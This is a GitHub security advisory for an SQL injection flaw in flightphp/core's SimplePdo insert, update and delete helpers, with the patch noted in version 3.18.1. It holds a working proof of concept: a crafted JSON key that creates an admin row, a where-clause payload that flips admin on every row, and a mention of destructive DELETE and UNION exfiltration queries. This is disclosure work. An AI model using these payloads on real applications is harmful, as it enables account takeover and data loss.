# [H] Flight vulnerable to SQL Injection via unvalidated identifiers in SimplePdo::insert / update / delete

## Summary
Severity: High
Advisory: GHSA-xwqr-rcqg-22mr
CVE: CVE-2026-42550
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-xwqr-rcqg-22mr
Type: github-advisory

## Affected
- Packagist: `flightphp/core` — affected >=0 <3.18.1

## Details
### Summary
`SimplePdo::insert()`, `SimplePdo::update()`, and `SimplePdo::delete()` build SQL statements by concatenating the `$table` argument and the **keys** of the `$data` array directly into the query, with no identifier quoting and no validation. When an application forwards user-controlled data shapes to these helpers — a common and documented pattern, e.g. `$db->insert('users', $request->data->getData())` — an attacker can inject arbitrary SQL by crafting malicious array keys.

### Affected code
`flight/database/SimplePdo.php`:

```php
// insert (≈ 320-373)
$sql = sprintf(
    "INSERT INTO %s (%s) VALUES (%s)",
    $table,                            // raw concat
    implode(', ', $columns),           // raw array_keys($data)
    implode(', ', $placeholders)
);

// update (≈ 397-409)
$sets[] = "$column = ?";               // $column = user-controlled key
$sql = sprintf(
    "UPDATE %s SET %s WHERE %s",
    $table,                            // raw
    implode(', ', $sets),
    $where
);

// delete (≈ 427-429)
$sql = "DELETE FROM $table WHERE $where";
```

No identifier-quoting helper exists; neither `$table` nor the data keys are validated against a safe-identifier pattern.

### Proof of concept
A controller does:
```php
$db->insert('users', $request->data->getData());
```

The attacker sends the JSON body:
```json
{"name, is_admin) VALUES (?, 1);-- ": "attacker_injected"}
```

Generated SQL:
```sql
INSERT INTO users (name, is_admin) VALUES (?, 1);-- ) VALUES (?)
```

After the `--` comment, the effective statement `INSERT INTO users (name, is_admin) VALUES (?, 1)` binds the single placeholder `'attacker_injected'`, yielding a row with `is_admin = 1`.

Reproduced live on an in-memory sqlite database (`testproj/sqli_live2.php`):

```
id=1  name=alice              is_admin=0
id=2  name=attacker_injected  is_admin=1   <-- injected insert
```

`UPDATE` injection via the `$where` parameter was also reproduced: `$db->update('users', ['is_admin' => 1], "id = 1 OR 1=1")` flips admin on every row.

### Impact
- **Privilege escalation** on any signup / register endpoint that forwards request data to `insert()` (attacker creates an administrative account in a single request).
- Arbitrary column write through `update()` keys.
- Data destruction and exfiltration through the `$where` parameter (`DELETE FROM users WHERE 1=1`, UNION-based exfil, etc.).

### Patch (fixed in `3.18.1`, commit `b8dd23a`)
A new `requireSafeIdentifier()` helper validates table names and column names against `^[A-Za-z_][A-Za-z0-9_]*$` before they are interpolated into the SQL string. The `$where` parameter remains raw SQL as documented — parameterized values passed alongside it continue to be bound safely.

### Credit
Discovered by **@Rootingg**.

## References
- https://github.com/flightphp/core/security/advisories/GHSA-xwqr-rcqg-22mr
- https://nvd.nist.gov/vuln/detail/CVE-2026-42550
- https://github.com/flightphp/core/commit/b8dd23aaa828cb289fa3c84e75b2a3717cab50b0
- https://github.com/flightphp/core
- https://github.com/flightphp/core/releases/tag/v3.18.1
